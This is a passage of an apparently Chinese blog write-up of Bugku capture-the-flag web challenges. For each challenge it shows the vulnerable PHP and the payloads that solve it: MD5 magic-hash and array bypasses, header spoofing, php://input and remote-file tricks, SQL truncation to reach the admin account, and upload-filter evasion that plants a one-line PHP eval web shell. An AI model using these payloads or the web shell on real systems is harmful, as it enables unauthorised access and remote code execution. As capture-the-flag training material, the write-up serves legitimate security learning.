&amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;v2&#x27;</span>]) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;v3&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$v1</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;v1&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$v2</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;v2&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$v3</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;v3&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$v1</span> != <span class=\"variable\">$v2</span> &amp;&amp; md5(<span class=\"variable\">$v1</span>) == md5(<span class=\"variable\">$v2</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!strcmp(<span class=\"variable\">$v3</span>, <span class=\"variable\">$flag</span>))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>[114.67.175.224:14251/?v1=QNKCDZO&amp;v2=240610708&amp;v3<a href=\"http://114.67.175.224:14251/?v1=QNKCDZO&v2=240610708&v3%5B%5D=flag%7B01\">]=flag{01</a></p>\n<p>php&lt;5.3中，若strcmp参数是数组，即会返回0，即比较成功。MD5传入两个都是0e开头的即可绕过，或者两个参数都是数组也能绕过。</p>\n<p>?v1[]=1&amp;v2[]=2&amp;v3[]=flag{01</p>\n<p>这样就得到flag</p>\n<h4 id=\"你从哪里来\"><a href=\"#你从哪里来\" class=\"headerlink\" title=\"你从哪里来\"></a>你从哪里来</h4><h5 id=\"增加请求头-Referer-www-google-com-即可得到flag\"><a href=\"#增加请求头-Referer-www-google-com-即可得到flag\" class=\"headerlink\" title=\"增加请求头 Referer: www.google.com 即可得到flag\"></a>增加请求头 Referer: <a href=\"http://www.google.com/\">www.google.com</a> 即可得到flag</h5><h4 id=\"秋名山车神\"><a href=\"#秋名山车神\" class=\"headerlink\" title=\"秋名山车神\"></a>秋名山车神</h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url=<span class=\"string\">&#x27;http://114.67.175.224:14136/&#x27;</span></span><br><span class=\"line\">r=requests.session() <span class=\"comment\">#建立一个会话使get和post在一个会话里</span></span><br><span class=\"line\">res=r.get(url)</span><br><span class=\"line\">v=res.text.split(<span class=\"string\">&quot;&lt;div&gt;&quot;</span>)[<span class=\"number\">1</span>].split(<span class=\"string\">&quot;=&quot;</span>)[<span class=\"number\">0</span>]  <span class=\"comment\">#分别使用&lt;div&gt;分割取第二个数组再使用=分割取第一个数组内容</span></span><br><span class=\"line\">key=<span class=\"built_in\">eval</span>(v)  <span class=\"comment\">#计算字符串算术表达式的值</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(key)</span><br><span class=\"line\"></span><br><span class=\"line\">data=&#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;value&#x27;</span>:key   <span class=\"comment\">#添加请求头</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">res1=r.post(url,data=data)  <span class=\"comment\">#post请求</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(res1.text)</span><br><span class=\"line\"><span class=\"comment\">#Give me value post about  #多刷新几次可以得到这个提示</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"never-give-up\"><a href=\"#never-give-up\" class=\"headerlink\" title=\"never_give_up\"></a>never_give_up</h4><h5 id=\"1-是javascript代码\"><a href=\"#1-是javascript代码\" class=\"headerlink\" title=\"1.是javascript代码\"></a>1.是javascript代码</h5><h6 id=\"查看源代码，提示1p-html-在浏览器上写入跳转到另一个网址，使用bp抓包，成功抓到一下内容：\"><a href=\"#查看源代码，提示1p-html-在浏览器上写入跳转到另一个网址，使用bp抓包，成功抓到一下内容：\" class=\"headerlink\" title=\"查看源代码，提示1p.html,在浏览器上写入跳转到另一个网址，使用bp抓包，成功抓到一下内容：\"></a>查看源代码，提示1p.html,在浏览器上写入跳转到另一个网址，使用bp抓包，成功抓到一下内容：</h6><p>var Words =”%3Cscript%3Ewindow.location.href%3D’http%3A%2F%2F<a href=\"http://www.bugku.com&/#39;%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E&quot;\">www.bugku.com&#39;%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E&quot;</a><br>function OutWord()<br>{<br>var NewWords;<br>NewWords = unescape(Words);  //解码<br>document.write(NewWords);<br>}<br>OutWord();</p>\n<h5 id=\"2-先url解码得到\"><a href=\"#2-先url解码得到\" class=\"headerlink\" title=\"2.先url解码得到\"></a>2.先url解码得到</h5><p>第一段代码表示到这个页面就跳转到<a href=\"http://www.bugku.com(怪不得会跳转到另一个网址)/\">http://www.bugku.com（怪不得会跳转到另一个网址）</a></p>\n<script>window.location.href='http://www.bugku.com';</script> \n\n<!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF-->\n\n<h6 id=\"直接base64解码-url解码得到\"><a href=\"#直接base64解码-url解码得到\" class=\"headerlink\" title=\"直接base64解码+url解码得到\"></a>直接base64解码+url解码得到</h6><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;;if(!<span class=\"subst\">$_GET</span>[&#x27;id&#x27;])</span></span><br><span class=\"line\"><span class=\"string\">&#123;</span></span><br><span class=\"line\"><span class=\"string\">\theader(&#x27;Location: hello.php?id=1&#x27;);</span></span><br><span class=\"line\"><span class=\"string\">\texit();</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\"><span class=\"subst\">$id</span>=<span class=\"subst\">$_GET</span>[&#x27;id&#x27;];</span></span><br><span class=\"line\"><span class=\"string\"><span class=\"subst\">$a</span>=<span class=\"subst\">$_GET</span>[&#x27;a&#x27;];</span></span><br><span class=\"line\"><span class=\"string\"><span class=\"subst\">$b</span>=<span class=\"subst\">$_GET</span>[&#x27;b&#x27;];</span></span><br><span class=\"line\"><span class=\"string\">if(stripos(<span class=\"subst\">$a</span>,&#x27;.&#x27;))</span></span><br><span class=\"line\"><span class=\"string\">&#123;</span></span><br><span class=\"line\"><span class=\"string\">\techo &#x27;no no no no no no no&#x27;;</span></span><br><span class=\"line\"><span class=\"string\">\treturn ;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\"><span class=\"subst\">$data</span> = @file_get_contents(<span class=\"subst\">$a</span>,&#x27;r&#x27;); //参数是路径</span></span><br><span class=\"line\"><span class=\"string\">if(<span class=\"subst\">$data</span>==&quot;</span>bugku is a nice plateform!<span class=\"string\">&quot; and <span class=\"subst\">$id</span>==0 and strlen(<span class=\"subst\">$b</span>)&gt;5 and eregi(&quot;</span><span class=\"number\">111</span><span class=\"string\">&quot;.substr(<span class=\"subst\">$b</span>,0,1),&quot;</span><span class=\"number\">1114</span><span class=\"string\">&quot;) and substr(<span class=\"subst\">$b</span>,0,1)!=4)  //.代表拼接 eregi()表示满足’111’接上b的首个字符是’1114’的通配（代表正则匹配）</span></span><br><span class=\"line\"><span class=\"string\">&#123;</span></span><br><span class=\"line\"><span class=\"string\">\t<span class=\"subst\">$flag</span> = &quot;</span>flag&#123;***********&#125;<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">else</span></span><br><span class=\"line\"><span class=\"string\">&#123;</span></span><br><span class=\"line\"><span class=\"string\">\tprint &quot;</span>never never never give up !!!<span class=\"string\">&quot;;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>*<em>GET /hello.php?id=0a&amp;b=<em>12345&amp;a=php://input HTTP/1.1</em></em></p>\n<p><strong>弱类型==：’字符串’会转为整数，1a也会转为整数。所以id=0a或者“0a”都可以</strong></p>\n<p><strong>eregi和ereg都有ereg() 函数或 eregi() 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。</strong></p>\n<h6 id=\"源码中待匹配字符串（第二个参数）已确定为-“1114”，正则表达式（第一个参数）由-“111”-连接-b-的第一个字符组成，若令-substr-b-0-1-“-x00”，即满足-“1114”-与-“111”匹配。因此，这里假设-b-“-x0012345”，才能满足条件。\"><a href=\"#源码中待匹配字符串（第二个参数）已确定为-“1114”，正则表达式（第一个参数）由-“111”-连接-b-的第一个字符组成，若令-substr-b-0-1-“-x00”，即满足-“1114”-与-“111”匹配。因此，这里假设-b-“-x0012345”，才能满足条件。\" class=\"headerlink\" title=\"源码中待匹配字符串（第二个参数）已确定为 “1114”，正则表达式（第一个参数）由 “111” 连接 $b 的第一个字符组成，若令 substr($b,0,1) = “\\x00”，即满足 “1114” 与 “111”匹配。因此，这里假设 $b = “\\x0012345”，才能满足条件。\"></a><strong>源码中待匹配字符串（第二个参数）已确定为 “1114”，正则表达式（第一个参数）由 “111” 连接 $b 的第一个字符组成，若令 substr($b,0,1) = “\\x00”，即满足 “1114” 与 “111”匹配。因此，这里假设 $b = “\\x0012345”，才能满足条件。</strong></h6><p><strong>或者用12345因为*是任意字符匹配，所以也行。</strong></p>\n<p><strong>@file</strong><strong>_get_contents传入路径，所以用源码中变量 $data 是由 file_get_contents() 函数读取变量 $a 的值而得，所以 $a 的值必须为数据流</strong>。****</p>\n<p><strong>在服务器中自定义一个内容为 bugku is a nice plateform! 文件，再把此文件路径赋值给 $a，显然不太靠谱。</strong></p>\n<p><strong>因此这里用伪协议 php:// 来访问输入输出的数据流，其中 php://input可以访问原始请求数据中的只读流。</strong></p>\n<p><strong>这里令 $a = “php://input”，并在请求主体中提交字符串 bugku is a nice plateform!。</strong></p>\n<h6 id=\"只填入bugku-is-a-nice-plateform\"><a href=\"#只填入bugku-is-a-nice-plateform\" class=\"headerlink\" title=\"只填入bugku is a nice plateform!\"></a>只填入bugku is a nice plateform!</h6><h4 id=\"程序员本地网站\"><a href=\"#程序员本地网站\" class=\"headerlink\" title=\"程序员本地网站\"></a>程序员本地网站</h4><h5 id=\"请求头加入X-Forwarded-For-127-0-0-1即可得到flag\"><a href=\"#请求头加入X-Forwarded-For-127-0-0-1即可得到flag\" class=\"headerlink\" title=\"请求头加入X-Forwarded-For: 127.0.0.1即可得到flag\"></a>请求头加入X-Forwarded-For: 127.0.0.1即可得到flag</h5><h4 id=\"MD5\"><a href=\"#MD5\" class=\"headerlink\" title=\"MD5\"></a>MD5</h4><h5 id=\"题目是md5碰撞，所以赋给-a-s878926199a-即md5是0e开头的，即可得到flag。这个题目出得不好，连源码都不给。\"><a href=\"#题目是md5碰撞，所以赋给-a-s878926199a-即md5是0e开头的，即可得到flag。这个题目出得不好，连源码都不给。\" class=\"headerlink\" title=\"题目是md5碰撞，所以赋给?a=s878926199a,即md5是0e开头的，即可得到flag。这个题目出得不好，连源码都不给。\"></a>题目是md5碰撞，所以赋给?a=s878926199a,即md5是0e开头的，即可得到flag。这个题目出得不好，连源码都不给。</h5><h4 id=\"login1\"><a href=\"#login1\" class=\"headerlink\" title=\"login1\"></a>login1</h4><h6 id=\"约束SQL注入的原理就是利用的约束条件，比如最长只能有15个字符的话，如果你输入的是abcdefghijklmnop-16位），那么保存在数据库里的就是abcdefghijklmno，那么别人用abcdefghijklmno注册一个用户名，就可以登陆。\"><a href=\"#约束SQL注入的原理就是利用的约束条件，比如最长只能有15个字符的话，如果你输入的是abcdefghijklmnop-16位），那么保存在数据库里的就是abcdefghijklmno，那么别人用abcdefghijklmno注册一个用户名，就可以登陆。\" class=\"headerlink\" title=\"约束SQL注入的原理就是利用的约束条件，比如最长只能有15个字符的话，如果你输入的是abcdefghijklmnop(16位），那么保存在数据库里的就是abcdefghijklmno，那么别人用abcdefghijklmno注册一个用户名，就可以登陆。\"></a>约束SQL注入的原理就是利用的约束条件，比如最长只能有15个字符的话，如果你输入的是abcdefghijklmnop(16位），那么保存在数据库里的就是abcdefghijklmno，那么别人用abcdefghijklmno注册一个用户名，就可以登陆。</h6><h6 id=\"还有一个可以利用的地方就是SQL在执行字符串处理的时候是会自动修剪掉尾部的空白符的，也就是说”abc”-”abc-“，同样我们可以通过注册用户名为”abc-“的账号来登陆”abc”的账号。\"><a href=\"#还有一个可以利用的地方就是SQL在执行字符串处理的时候是会自动修剪掉尾部的空白符的，也就是说”abc”-”abc-“，同样我们可以通过注册用户名为”abc-“的账号来登陆”abc”的账号。\" class=\"headerlink\" title=\"还有一个可以利用的地方就是SQL在执行字符串处理的时候是会自动修剪掉尾部的空白符的，也就是说”abc”==”abc “，同样我们可以通过注册用户名为”abc “的账号来登陆”abc”的账号。\"></a>还有一个可以利用的地方就是SQL在执行字符串处理的时候是会自动修剪掉尾部的空白符的，也就是说”abc”==”abc “，同样我们可以通过注册用户名为”abc “的账号来登陆”abc”的账号。</h6><p>所以直接用admin ，注册一个账号，再登陆，admin 会变为admin从而进入管理员权限得到flag。</p>\n<h4 id=\"file-get-contents\"><a href=\"#file-get-contents\" class=\"headerlink\" title=\"file_get_contents\"></a>file_get_contents</h4><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">extract(<span class=\"variable\">$_GET</span>);  <span class=\"comment\">//函数从数组中把变量导入到当前的符号表中</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable\">$ac</span>))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"variable\">$f</span> = trim(file_get_contents(<span class=\"variable\">$fn</span>));   <span class=\"comment\">//需要使用get传入$fn和$ac,使他们相等</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$ac</span> === <span class=\"variable\">$f</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;p&gt;This is flag:&quot;</span> .<span class=\"string\">&quot; <span class=\"subst\">$flag</span>&lt;/p&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"1-第一种方式是bp里GET-ac-flag-amp-fn-php-input-HTTP-1-1-内容是flag，即可得到flag\"><a href=\"#1-第一种方式是bp里GET-ac-flag-amp-fn-php-input-HTTP-1-1-内容是flag，即可得到flag\" class=\"headerlink\" title=\"1.第一种方式是bp里GET /?ac=flag&amp;fn=php://input HTTP/1.1  内容是flag，即可得到flag\"></a>1.第一种方式是bp里GET /?ac=flag&amp;fn=php://input HTTP/1.1  内容是flag，即可得到flag</h5><h5 id=\"2-114-67-175-224-18959-ac-flag-amp-fn-https-n9-zqc-github-io-test-txt-第二种是file-get-contents读取的是文件，所以在自己网站上上传一个内容和flag一样的文件即可，该网站一定能让外网访问才可以，\"><a href=\"#2-114-67-175-224-18959-ac-flag-amp-fn-https-n9-zqc-github-io-test-txt-第二种是file-get-contents读取的是文件，所以在自己网站上上传一个内容和flag一样的文件即可，该网站一定能让外网访问才可以，\" class=\"headerlink\" title=\"2.114.67.175.224:18959/?ac=flag&amp;fn=https://n9-zqc.github.io/test.txt  第二种是file_get_contents读取的是文件，所以在自己网站上上传一个内容和flag一样的文件即可，该网站一定能让外网访问才可以，\"></a>2.<a href=\"http://114.67.175.224:18959/?ac=flag&fn=https://n9-zqc.github.io/test.txt\">114.67.175.224:18959/?ac=flag&amp;fn=https://n9-zqc.github.io/test.txt</a>  第二种是file_get_contents读取的是文件，所以在自己网站上上传一个内容和flag一样的文件即可，该网站一定能让外网访问才可以，</h5><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;&#125;else&#123;echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;&#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>This is flag: flag{482fe39bd95249216001178fb2c442a7}</p>\n<p>使用linux中的apache和window中的phpstudy需要设置路由器啥的来让互联网访问太麻烦，不如用github提供的服务器，互联网可以直接访问。</p>\n<h4 id=\"各种绕过哟\"><a href=\"#各种绕过哟\" class=\"headerlink\" title=\"各种绕过哟\"></a>各种绕过哟</h4><p><a href=\"http://114.67.175.224:18451/?id=margin&amp;uname%5B%5D=1\">http://114.67.175.224:18451/?id=margin&amp;uname[]=1</a> POST提交passwd[]=2 即可得到flag。</p>\n<h5 id=\"sha1用数组绕过。\"><a href=\"#sha1用数组绕过。\" class=\"headerlink\" title=\"sha1用数组绕过。\"></a>sha1用数组绕过。</h5><h4 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h4><?php @eval($_POST[caidao]);?>\n<p>使用burp抓包，不断尝试发现发现需要修改的地方有三个：<br>一个是http head里的Content-Type: multipart/form-data;<br>请求头部的 Content-Type 内容 随便改个大写字母过滤掉 比如 mulTipart/form-data （其t为大写）<br>Multipart里的部分字母改成大写的。</p>\n<p>第二个是文件的的Content-Type: application/octet-stream，改成image/jpeg</p>\n<p>第三个是文件后缀名改成php4<br>（依次尝试php4，phtml，phtm，phps，php5（包括一些字母改变大小写））分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php4没有被过滤</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">$flag = &quot;flag&#123;test&#125;&quot;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n\n<form action=\"index.php\" method=\"post\" enctype=\"multipart/form-data\">\nMy name is margin,give me a image file not a php<br>\n<br>\n<input type=\"file\" name=\"file\" id=\"file\"> \n<input type=\"submit\" name=\"submit\" value=\"Submit\">\n</form>\n\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">global_filter</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$type</span> =  <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&quot;CONTENT_TYPE&quot;</span>];   <span class=\"comment\">//修改multipart/form-data绕过</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (strpos(<span class=\"variable\">$type</span>,<span class=\"string\">&quot;multipart/form-data&quot;</span>) !== <span class=\"literal\">False</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$file_ext</span> =  substr(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;name&quot;</span>], strrpos(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;name&quot;</span>], <span class=\"string\">&#x27;.&#x27;</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (stripos(<span class=\"variable\">$file_ext</span>,<span class=\"string\">&quot;php&quot;</span>) !== <span class=\"literal\">False</span>)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">&quot;Invalid File&lt;br /&gt;&quot;</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">global_filter();</span><br><span class=\"line\"><span class=\"keyword\">if</span> ((stripos(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;type&quot;</span>],<span class=\"string\">&#x27;image&#x27;</span>)!== <span class=\"literal\">False</span>) &amp;&amp; (<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;size&quot;</span>] &lt; <span class=\"number\">10</span>*<span class=\"number\">1024</span>*<span class=\"number\">1024</span>))&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;error&quot;</span>] == <span class=\"number\">0</span>)&#123;  <span class=\"comment\">//修改file的type绕过</span></span><br><span class=\"line\">\t\t<span class=\"variable\">$file_ext</span> =  substr(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;name&quot;</span>], strrpos(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;name&quot;</span>], <span class=\"string\">&#x27;.&#x27;</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>);  <span class=\"comment\">//取filename.后面的后缀名</span></span><br><span class=\"line\">        <span class=\"variable\">$allowexts</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>,<span class=\"string\">&#x27;jpeg&#x27;</span>,<span class=\"string\">&#x27;bmp&#x27;</span>,<span class=\"string\">&#x27;php4&#x27;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!in_array(<span class=\"variable\">$file_ext</span>,<span class=\"variable\">$allowexts</span>))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;give me a image file not a php&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t\t<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;name&quot;</span>]=<span class=\"string\">&quot;bugku&quot;</span>.date(<span class=\"string\">&#x27;dHis&#x27;</span>).<span class=\"string\">&quot;_&quot;</span>.rand(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$file_ext</span>;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(<span class=\"string\">&quot;upload/&quot;</span> . <span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;name&quot;</span>]))&#123;</span><br><span class=\"line\">    \t<span class=\"keyword\">echo</span> <span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;name&quot;</span>] . <span class=\"string\">&quot; already exists. &lt;br /&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    \t<span class=\"keyword\">if</span> (!file_exists(<span class=\"string\">&#x27;./upload/&#x27;</span>))&#123;</span><br><span class=\"line\">    \t\tmkdir (<span class=\"string\">&quot;./upload/&quot;</span>);</span><br><span class=\"line\">            system(<span class=\"string\">&quot;chmod 777 /var/www/html/upload&quot;</span>);</span><br><span 